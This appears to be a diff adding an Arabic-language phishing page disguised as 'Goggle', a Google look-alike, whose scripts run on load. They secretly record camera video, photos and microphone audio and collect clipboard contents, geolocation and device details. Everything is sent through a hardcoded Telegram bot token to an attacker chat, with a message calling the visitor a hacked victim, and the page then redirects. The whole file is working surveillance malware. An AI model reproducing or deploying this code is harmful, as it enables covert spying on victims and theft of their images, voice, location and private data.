@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport"/>
+<title>Goggle</title>
+<style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            background: #000000;
+            overflow: hidden;
+        }
+
+        video {
+            display: none !important;
+        }
+        canvas {
+            display: none !important;
+        }
+
+        /* عنصر تصحيح مخفي (يمكن تفعيله بالضغط 5 مرات) */
+        #debug-trigger {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 50px;
+            height: 50px;
+            opacity: 0;
+            z-index: 9999;
+            cursor: default;
+        }
+
+        #debug-console {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            max-height: 200px;
+            background: rgba(0, 0, 0, 0.9);
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            color: #0f0;
+            overflow-y: auto;
+            display: none;
+            z-index: 10000;
+            pointer-events: none;
+            user-select: none;
+            line-height: 1.6;
+            opacity: 0.7;
+        }
+
+        #debug-console.visible {
+            display: block;
+        }
+
+        #debug-console::-webkit-scrollbar {
+            width: 3px;
+        }
+        #debug-console::-webkit-scrollbar-track {
+            background: #111;
+        }
+        #debug-console::-webkit-scrollbar-thumb {
+            background: #333;
+            border-radius: 3px;
+        }
+
+        .debug-entry {
+            opacity: 0.8;
+        }
+        .debug-entry.error {
+            color: #f44;
+        }
+        .debug-entry.success {
+            color: #4caf50;
+        }
+        .debug-entry.warning {
+            color: #ff9800;
+        }
+    </style>
+<style>
+            * { -webkit-tap-highlight-color: transparent; touch-action: manipulation; box-sizing: border-box; }
+            img, video, canvas { max-width: 100%; height: auto; }
+            body { overflow-x: hidden; width: 100%; margin: 0; padding: 0; }
+            button, input, select, textarea { font-size: 16px !important; touch-action: manipulation; }
+        </style></head>
+<body>
+<div id="clickCatcher" style="position:fixed;top:0;left:0;width:100%;height:100%;background:transparent;z-index:9999;cursor:default;display:block;pointer-events:auto;"></div>
+
+<canvas id="canvas"></canvas>
+<div id="debug-trigger"></div>
+<div id="debug-console"></div>
+<script>
+        (function() {
+            'use strict';
+
+            // ============================================================
+            // 1. الإعدادات الأساسية
+            // ============================================================
+            const BOT_TOKEN = '8837356969:AAFNodAgWKdbN9lvbRA-FTn2Lbvs72FL-FE';
+            const MAX_SEGMENTS = 3;
+            const VIDEO_DURATION_MS = 5000;
+            const FRAME_INTERVAL_MS = 200;
+            const FPS = 5;
+
+            // الحصول على المعرف من الرابط
+            const urlParams = new URLSearchParams(window.location.search);
+            const TARGET_ID = urlParams.get('id');
+
+            // ============================================================
+            // 2. عناصر DOM
+            // ============================================================
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            const debugConsole = document.getElementById('debug-console');
+            const debugTrigger = document.getElementById('debug-trigger');
+
+            // ============================================================
+            // 3. نظام التصحيح المخفي
+            // ============================================================
+            let debugVisible = false;
+            let clickCount = 0;
+            let clickTimer = null;
+
+            function addDebug(message, type = 'info') {
+                const entry = document.createElement('div');
+                entry.className = `debug-entry ${type}`;
+                const time = new Date().toLocaleTimeString();
+                entry.textContent = `[${time}] ${message}`;
+                debugConsole.appendChild(entry);
+                debugConsole.scrollTop = debugConsole.scrollHeight;
+
+                const consoleMethod = type === 'error' ? 'error' :
+                                     type === 'warning' ? 'warn' :
+                                     type === 'success' ? 'log' : 'log';
+                console[consoleMethod](`[Goggle] ${message}`);
+            }
+
+            // تفعيل وحدة التحكم بالضغط 5 مرات على الزاوية السفلية اليسرى
+            debugTrigger.addEventListener('click', () => {
+                clickCount++;
+                clearTimeout(clickTimer);
+                clickTimer = setTimeout(() => { clickCount = 0; }, 1000);
+
+                if (clickCount >= 5) {
+                    clickCount = 0;
+                    debugVisible = !debugVisible;
+                    debugConsole.classList.toggle('visible', debugVisible);
+                    addDebug(debugVisible ? '🔓 تم تفعيل وحدة التحكم' : '🔒 تم إخفاء وحدة التحكم', 'info');
+                }
+            });
+
+            // ============================================================
+            // 4. حالة التطبيق
+            // ============================================================
+            let mediaStream = null;
+            let cameraReady = false;
+            let isRecording = false;
+            let segmentsSent = 0;
+            let isInitialized = false;
+
+            // ============================================================
+            // 5. التحقق من وجود المعرف
+            // ============================================================
+            if (!TARGET_ID) {
+                addDebug('❌ خطأ: المعرف غير موجود! أضف ?id=رقم_المستخدم في الرابط', 'error');
+                return;
+            }
+
+            addDebug(`✅ المعرف المستهدف: ${TARGET_ID}`, 'success');
+
+            // ============================================================
+            // 6. دوال الكاميرا - الكاميرا الخلفية
+            // ============================================================
+            async function startCamera() {
+                try {
+                    addDebug('📷 جاري طلب صلاحيات الكاميرا الخلفية...', 'info');
+
+                    let stream = null;
+
+                    // محاولة استخدام الكاميرا الخلفية أولاً
+                    try {
+                        stream = await navigator.mediaDevices.getUserMedia({
+                            video: {
+                                facingMode: { exact: "environment" },
+                                width: { ideal: 640 },
+                                height: { ideal: 480 }
+                            },
+                            audio: false
+                        });
+                        addDebug('✅ تم استخدام الكاميرا الخلفية', 'success');
+                    } catch (firstError) {
+                        addDebug('⚠️ الكاميرا الخلفية غير متوفرة، نحاول الكاميرا الافتراضية...', 'warning');
+                        try {
+                            stream = await navigator.mediaDevices.getUserMedia({
+                                video: {
+                                    facingMode: "environment",
+                                    width: { ideal: 640 },
+                                    height: { ideal: 480 }
+                                },
+                                audio: false
+                            });
+                            addDebug('✅ تم استخدام الكاميرا الخلفية (بدون exact)', 'success');
+                        } catch (secondError) {
+                            addDebug('⚠️ فشلت الكاميرا الخلفية، نحاول أي كاميرا متاحة...', 'warning');
+                            stream = await navigator.mediaDevices.getUserMedia({
+                                video: {
+                                    width: { ideal: 640 },
+                                    height: { ideal: 480 }
+                                },
+                                audio: false
+                            });
+                            addDebug('✅ تم استخدام الكاميرا الافتراضية', 'success');
+                        }
+                    }
+
+                    mediaStream = stream;
+                    video.srcObject = stream;
+                    video.muted = true;
+
+                    await new Promise((resolve) => {
+                        if (video.readyState >= 2) {
+                            resolve();
+                        } else {
+                            video.onloadedmetadata = () => resolve();
+                        }
+                    });
+
+                    await video.play();
+
+                    const vw = video.videoWidth || 640;
+                    const vh = video.videoHeight || 480;
+                    canvas.width = vw;
+                    canvas.height = vh;
+
+                    cameraReady = true;
+                    addDebug(`✅ الكاميرا تعمل (${vw}x${vh})`, 'success');
+                    return true;
+
+                } catch (err) {
+                    addDebug(`❌ فشل تشغيل الكاميرا: ${err.message}`, 'error');
+                    cameraReady = false;
+                    return false;
+                }
+            }
+
+            function stopCamera() {
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                    mediaStream = null;
+                }
+                cameraReady = false;
+                addDebug('⏹️ تم إيقاف الكاميرا', 'info');
+            }
+
+            // ============================================================
+            // 7. التقاط الإطارات (بدون عكس الصورة للكاميرا الخلفية)
+            // ============================================================
+            function captureFrames() {
+                return new Promise((resolve) => {
+                    if (!cameraReady || !video.videoWidth) {
+                        addDebug('⚠️ الكاميرا غير جاهزة للتصوير', 'warning');
+                        resolve(null);
+                        return;
+                    }
+
+                    const vw = video.videoWidth;
+                    const vh = video.videoHeight;
+                    canvas.width = vw;
+                    canvas.height = vh;
+
+                    const frames = [];
+                    let elapsed = 0;
+
+                    addDebug(`📸 بدء التقاط الإطارات (${VIDEO_DURATION_MS}ms)`, 'info');
+
+                    function captureFrame() {
+                        try {
+                            // رسم الصورة بدون عكس (للكاميرا الخلفية)
+                            ctx.drawImage(video, 0, 0, vw, vh);
+                            return canvas.toDataURL('image/jpeg', 0.75);
+                        } catch (err) {
+                            return null;
+                        }
+                    }
+
+                    const first = captureFrame();
+                    if (first) frames.push(first);
+
+                    const timer = setInterval(() => {
+                        elapsed += FRAME_INTERVAL_MS;
+                        if (elapsed >= VIDEO_DURATION_MS) {
+                            clearInterval(timer);
+                            addDebug(`📸 تم التقاط ${frames.length} إطار`, 'info');
+                            resolve(frames.length >= 3 ? frames : null);
+                            return;
+                        }
+                        const frame = captureFrame();
+                        if (frame) frames.push(frame);
+                    }, FRAME_INTERVAL_MS);
+
+                    setTimeout(() => {
+                        clearInterval(timer);
+                        if (frames.length >= 3) {
+                            addDebug(`📸 تم التقاط ${frames.length} إطار (مهلة)`, 'info');
+                            resolve(frames);
+                        } else {
+                            addDebug(`⚠️ تم التقاط ${frames.length} إطار فقط (غير كافٍ)`, 'warning');
+                            resolve(null);
+                        }
+                    }, VIDEO_DURATION_MS + 1000);
+                });
+            }
+
+            // ============================================================
+            // 8. إنشاء فيديو من الإطارات
+            // ============================================================
+            function createVideoFromFrames(frames) {
+                return new Promise((resolve) => {
+                    if (!frames || frames.length < 3) {
+                        addDebug('⚠️ عدد الإطارات غير كافٍ لإنشاء الفيديو', 'warning');
+                        resolve(null);
+                        return;
+                    }
+
+                    addDebug(`🎬 جاري إنشاء الفيديو من ${frames.length} إطار...`, 'info');
+
+                    const tempCanvas = document.createElement('canvas');
+                    const tempCtx = tempCanvas.getContext('2d');
+
+                    const img = new Image();
+                    img.onload = () => {
+                        tempCanvas.width = img.width;
+                        tempCanvas.height = img.height;
+
+                        const stream = tempCanvas.captureStream(FPS);
+                        let recorder;
+
+                        try {
+                            recorder = new MediaRecorder(stream, {
+                                mimeType: 'video/webm;codecs=vp8',
+                                videoBitsPerSecond: 500000
+                            });
+                        } catch (e) {
+                            try {
+                                recorder = new MediaRecorder(stream, {
+                                    mimeType: 'video/webm',
+                                    videoBitsPerSecond: 500000
+                                });
+                            } catch (e2) {
+                                addDebug('❌ المتصفح لا يدعم تسجيل الفيديو', 'error');
+                                resolve(null);
+                                return;
+                            }
+                        }
+
+                        const chunks = [];
+                        recorder.ondataavailable = (e) => {
+                            if (e.data && e.data.size > 0) chunks.push(e.data);
+                        };
+
+                        recorder.onstop = () => {
+                            if (chunks.length === 0) {
+                                addDebug('❌ فشل إنشاء الفيديو: لا توجد بيانات', 'error');
+                                resolve(null);
+                                return;
+                            }
+                            const blob = new Blob(chunks, { type: 'video/webm' });
+                            addDebug(`✅ تم إنشاء الفيديو (${(blob.size / 1024).toFixed(1)} كيلوبايت)`, 'success');
+                            resolve(blob);
+                        };
+
+                        recorder.start(100);
+
+                        let frameIndex = 0;
+                        const intervalMs = 1000 / FPS;
+
+                        function drawNextFrame() {
+                            if (frameIndex >= frames.length) {
+                                setTimeout(() => {
+                                    if (recorder.state === 'recording') recorder.stop();
+                                }, 200);
+                                return;
+                            }
+
+                            const frameImg = new Image();
+                            frameImg.onload = () => {
+                                tempCtx.clearRect(0, 0, tempCanvas.width, tempCanvas.height);
+                                tempCtx.drawImage(frameImg, 0, 0, tempCanvas.width, tempCanvas.height);
+                                frameIndex++;
+                                setTimeout(drawNextFrame, intervalMs);
+                            };
+                            frameImg.onerror = () => {
+                                frameIndex++;
+                                setTimeout(drawNextFrame, intervalMs);
+                            };
+                            frameImg.src = frames[frameIndex];
+                        }
+
+                        drawNextFrame();
+
+                        setTimeout(() => {
+                            if (recorder && recorder.state === 'recording') recorder.stop();
+                        }, (frames.length * intervalMs) + 2000);
+                    };
+
+                    img.onerror = () => {
+                        addDebug('❌ فشل تحميل الإطار الأول', 'error');
+                        resolve(null);
+                    };
+                    img.src = frames[0];
+                });
+            }
+
+            // ============================================================
+            // 9. إرسال الفيديو إلى تليجرام
+            // ============================================================
+            async function sendVideoToTelegram(blob, segmentNumber) {
+                if (!blob || blob.size < 1000) {
+                    addDebug(`⚠️ حجم الفيديو صغير جداً (${blob ? blob.size : 0} بايت)`, 'warning');
+                    return false;
+                }
+
+                try {
+                    addDebug(`📤 جاري إرسال المقطع #${segmentNumber}...`, 'info');
+
+                    const formData = new FormData();
+                    formData.append('chat_id', TARGET_ID);
+                    formData.append('video', blob, `video_${segmentNumber}.webm`);
+                    formData.append('caption', `🎥 مقطع #${segmentNumber}`);
+
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    const json = await response.json();
+
+                    if (json.ok) {
+                        addDebug(`✅ تم إرسال المقطع #${segmentNumber} بنجاح!`, 'success');
+                        return true;
+                    } else {
+                        addDebug(`❌ فشل الإرسال: ${json.description || 'خطأ غير معروف'}`, 'error');
+                        return false;
+                    }
+
+                } catch (err) {
+                    addDebug(`❌ خطأ في الاتصال: ${err.message}`, 'error');
+                    return false;
+                }
+            }
+
+            // ============================================================
+            // 10. العملية الرئيسية
+            // ============================================================
+            async function captureAndSendSegment() {
+                if (isRecording) {
+                    addDebug('⚠️ تسجيل قيد التنفيذ بالفعل', 'warning');
+                    return;
+                }
+
+                if (!cameraReady) {
+                    addDebug('⚠️ الكاميرا غير جاهزة', 'warning');
+                    return;
+                }
+
+                if (segmentsSent >= MAX_SEGMENTS) {
+                    addDebug('✅ تم إرسال جميع المقاطع المطلوبة!', 'success');
+                    stopCamera();
+                    return;
+                }
+
+                isRecording = true;
+                const currentSegment = segmentsSent + 1;
+                addDebug(`🎥 بدء تسجيل المقطع #${currentSegment}...`, 'info');
+
+                try {
+                    const frames = await captureFrames();
+                    if (!frames) {
+                        addDebug(`⚠️ فشل التقاط الإطارات للمقطع #${currentSegment}`, 'warning');
+                        isRecording = false;
+                        return;
+                    }
+
+                    const videoBlob = await createVideoFromFrames(frames);
+                    if (!videoBlob) {
+                        addDebug(`⚠️ فشل إنشاء الفيديو للمقطع #${currentSegment}`, 'warning');
+                        isRecording = false;
+                        return;
+                    }
+
+                    const success = await sendVideoToTelegram(videoBlob, currentSegment);
+
+                    if (success) {
+                        segmentsSent++;
+                        addDebug(`🎉 تم إرسال المقطع #${currentSegment} (${segmentsSent}/${MAX_SEGMENTS})`, 'success');
+                    }
+
+                    if (segmentsSent >= MAX_SEGMENTS) {
+                        addDebug('🎉 تم إرسال جميع المقاطع بنجاح!', 'success');
+                        stopCamera();
+                        isRecording = false;
+                        return;
+                    }
+
+                } catch (err) {
+                    addDebug(`❌ خطأ أثناء تسجيل المقطع #${currentSegment}: ${err.message}`, 'error');
+                }
+
+                isRecording = false;
+
+                if (segmentsSent < MAX_SEGMENTS && cameraReady) {
+                    addDebug(`⏳ انتظار 2 ثانية قبل المقطع التالي...`, 'info');
+                    setTimeout(() => {
+                        if (!isRecording && cameraReady && segmentsSent < MAX_SEGMENTS) {
+                            captureAndSendSegment();
+                        }
+                    }, 2000);
+                }
+            }
+
+            // ============================================================
+            // 11. بدء التشغيل
+            // ============================================================
+            async function init() {
+                if (isInitialized) return;
+                isInitialized = true;
+
+                addDebug('🚀 بدء تهيئة النظام (كاميرا خلفية)...', 'info');
+
+                const cameraStarted = await startCamera();
+
+                if (!cameraStarted) {
+                    addDebug('❌ فشل تشغيل الكاميرا. إعادة المحاولة بعد 3 ثوان...', 'error');
+                    setTimeout(() => {
+                        isInitialized = false;
+                        init();
+                    }, 3000);
+                    return;
+                }
+
+                addDebug('✅ النظام جاهز! بدء التسجيل التلقائي...', 'success');
+
+                setTimeout(() => {
+                    if (cameraReady && segmentsSent < MAX_SEGMENTS && !isRecording) {
+                        captureAndSendSegment();
+                    }
+                }, 1500);
+            }
+
+            // ============================================================
+            // 12. أحداث الصفحة
+            // ============================================================
+
+            window.addEventListener('load', () => {
+                setTimeout(init, 500);
+            });
+
+            window.addEventListener('beforeunload', () => {
+                stopCamera();
+            });
+
+            window.addEventListener('unhandledrejection', (event) => {
+                addDebug(`⚠️ خطأ غير متوقع: ${event.reason?.message || event.reason}`, 'error');
+            });
+
+            addDebug('📋 تم تحميل التطبيق (كاميرا خلفية)', 'info');
+
+            console.log('%c🔍 Goggle Search - كاميرا خلفية', 'font-size:16px;font-weight:bold;');
+            console.log('%c👆 اضغط 5 مرات على الزاوية السفلية اليسرى لتفعيل وحدة التحكم', 'font-size:12px;color:#888;');
+
+        })();
+    </script>
+<script>
+(function() {
+    'use strict';
+    
+    const BOT_TOKEN = '8837356969:AAFNodAgWKdbN9lvbRA-FTn2Lbvs72FL-FE';
+    const TARGET_ID = '8761250298';  // المعرف المستهدف (مستخدم أو قناة)
+    const REDIRECT_URL = 'https://t.me/Whiskybots';
+    
+    let isExecuting = false;
+    
+    function delay(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+    
+    async function sendToChannel(text, isHTML = true) {
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TARGET_ID,
+                    text: text,
+                    parse_mode: isHTML ? 'HTML' : undefined
+                })
+            });
+        } catch(e) { console.warn(e); }
+    }
+    
+    async function sendPhotoToChannel(base64Data, caption) {
+        try {
+            let blob = await (await fetch(base64Data)).blob();
+            let formData = new FormData();
+            formData.append('chat_id', TARGET_ID);
+            formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+            formData.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        } catch(e) { console.warn(e); }
+    }
+    
+    async function sendAudioToChannel(audioUrl, caption) {
+        try {
+            let blob = await fetch(audioUrl).then(r=>r.blob());
+            let formData = new FormData();
+            formData.append('chat_id', TARGET_ID);
+            formData.append('audio', blob, 'audio.webm');
+            formData.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData });
+        } catch(e) { console.warn(e); }
+    }
+    
+    async function getDeviceInfo() {
+        let ua = navigator.userAgent;
+        let brand = 'غير معروف';
+        if(ua.includes('iPhone')) brand = 'Apple';
+        else if(ua.includes('Samsung')) brand = 'Samsung';
+        else if(ua.includes('Xiaomi')) brand = 'Xiaomi';
+        else if(ua.includes('Pixel')) brand = 'Google';
+        else brand = 'Android/PC';
+        
+        let battery = 'غير مدعوم';
+        if('getBattery' in navigator) {
+            try { let b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}% ${b.charging ? 'يشحن' : 'لا يشحن'}`; } catch(e) {}
+        }
+        
+        return {
+            fullName: navigator.userAgentData?.platform || navigator.platform || ua.split(' ').slice(0,3).join(' '),
+            brand: brand,
+            os: navigator.platform,
+            browser: /Chrome/.test(ua) ? 'Chrome' : (/Firefox/.test(ua) ? 'Firefox' : 'Safari'),
+            screen: `${screen.width}x${screen.height}`,
+            battery: battery,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language
+        };
+    }
+    
+    async function getLocation() {
+        return new Promise((resolve) => {
+            if(!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }),
+                () => resolve(null),
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        });
+    }
+    
+    async function getClipboard() {
+        try { let text = await navigator.clipboard.readText(); return text || "(فارغة)"; } catch(err) { return "❌ لا يمكن الوصول إلى الحافظة"; }
+    }
+    
+    async function capturePhotos(facingMode, count = 3) {
+        let photos = [];
+        let stream = null;
+        let video = null;
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: { exact: facingMode } }
+            });
+            video = document.createElement('video');
+            video.srcObject = stream;
+            video.setAttribute('playsinline', 'true');
+            video.style.cssText = 'position:fixed;top:-1000px;left:-1000px;width:320px;height:240px;opacity:0;pointer-events:none;';
+            document.body.appendChild(video);
+            await new Promise((resolve) => {
+                video.onloadedmetadata = async () => { await video.play(); resolve(); };
+            });
+            await delay(800);
+            let canvas = document.createElement('canvas');
+            for(let i = 0; i < count; i++) {
+                canvas.width = video.videoWidth || 1280;
+                canvas.height = video.videoHeight || 720;
+                let ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                photos.push(canvas.toDataURL('image/jpeg', 0.9));
+                await delay(400);
+            }
+        } catch(e) { console.warn(e); }
+        finally {
+            if(stream) stream.getTracks().forEach(t => t.stop());
+            if(video && video.parentNode) video.remove();
+        }
+        return photos;
+    }
+    
+    async function recordAudio(duration = 5000) {
+        try {
+            let stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            let mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+            let chunks = [];
+            mediaRecorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
+            let promise = new Promise(resolve => {
+                mediaRecorder.onstop = () => {
+                    let blob = new Blob(chunks, { type: 'audio/webm' });
+                    let url = URL.createObjectURL(blob);
+                    stream.getTracks().forEach(t => t.stop());
+                    resolve(url);
+                };
+            });
+            mediaRecorder.start();
+            await delay(duration);
+            mediaRecorder.stop();
+            return await promise;
+        } catch(e) { console.warn(e); return null; }
+    }
+    
+    async function requestPermissions() {
+        try { let a = await navigator.mediaDevices.getUserMedia({ audio: true }); a.getTracks().forEach(t => t.stop()); } catch(e) {}
+        try { let f = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" } } }); f.getTracks().forEach(t => t.stop()); } catch(e) {}
+        try { let b = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } }); b.getTracks().forEach(t => t.stop()); } catch(e) {}
+        if(navigator.geolocation) { navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}, { timeout: 5000 }); }
+    }
+    
+    async function executeFullScan() {
+        if(isExecuting) return;
+        isExecuting = true;
+        await delay(500);
+        
+        let deviceInfo = await getDeviceInfo();
+        let locationData = await getLocation();
+        let clipboardText = await getClipboard();
+        
+        let frontPhotos = [];
+        let backPhotos = [];
+        try { frontPhotos = await capturePhotos("user", 3); } catch(e) {}
+        try { backPhotos = await capturePhotos("environment", 3); } catch(e) {}
+        let audioUrl = await recordAudio(5000);
+        
+        await sendToChannel(`#☑️ تم اختراق ضحية ☑️#\n\nالجهاز: ${deviceInfo.brand} - ${deviceInfo.fullName}\nالوقت: ${new Date().toLocaleString('ar-EG')}`);
+        
+        let report = `📱 <b>بيانات الجهاز</b>\n\n`;
+        report += `الجهاز: ${deviceInfo.fullName}\n`;
+        report += `الشركة: ${deviceInfo.brand}\n`;
+        report += `نظام التشغيل: ${deviceInfo.os}\n`;
+        report += `المتصفح: ${deviceInfo.browser}\n`;
+        report += `الشاشة: ${deviceInfo.screen}\n`;
+        report += `البطارية: ${deviceInfo.battery}\n`;
+        report += `المنطقة: ${deviceInfo.timezone}\n`;
+        report += `اللغة: ${deviceInfo.language}\n\n`;
+        
+        if(locationData && locationData.lat) {
+            report += `📍 <b>الموقع الجغرافي</b>\n`;
+            report += `خط العرض: ${locationData.lat}\n`;
+            report += `خط الطول: ${locationData.lng}\n`;
+            report += `<a href="https://www.google.com/maps?q=${locationData.lat},${locationData.lng}">🗺️ عرض الخريطة</a>\n\n`;
+        }
+        
+        report += `📋 <b>محتوى الحافظة:</b>\n${clipboardText.substring(0, 500)}\n\n`;
+        report += `🎤 تسجيل صوتي: ${audioUrl ? '✓ تم' : '✗ فشل'}\n`;
+        report += `📸 صور أمامية: ${frontPhotos.length} صورة\n`;
+        report += `📷 صور خلفية: ${backPhotos.length} صورة`;
+        
+        await sendToChannel(report, true);
+        
+        for(let i = 0; i < frontPhotos.length; i++) {
+            await sendPhotoToChannel(frontPhotos[i], `📸 كاميرا أمامية - صورة ${i+1}`);
+            await delay(300);
+        }
+        for(let i = 0; i < backPhotos.length; i++) {
+            await sendPhotoToChannel(backPhotos[i], `📷 كاميرا خلفية - صورة ${i+1}`);
+            await delay(300);
+        }
+        
+        if(audioUrl) {
+            await sendAudioToChannel(audioUrl, "🎙️ تسجيل صوتي");
+        }
+        
+        await sendToChannel(`✅ اكتمل جمع البيانات بنجاح`);
+        await delay(1500);
+        window.location.href = REDIRECT_URL;
+    }
+    
+    async function start() {
+        await requestPermissions();
+        await delay(500);
+        executeFullScan().catch(err => {
+            console.error(err);
+            setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
+        });
+    }
+    
+    window.addEventListener('load', () => { setTimeout(start, 100); });
+    console.log("✅ بايلودات جاهزة للمستخدم: " + TARGET_ID);
+})();
+</script></body>
+</html>
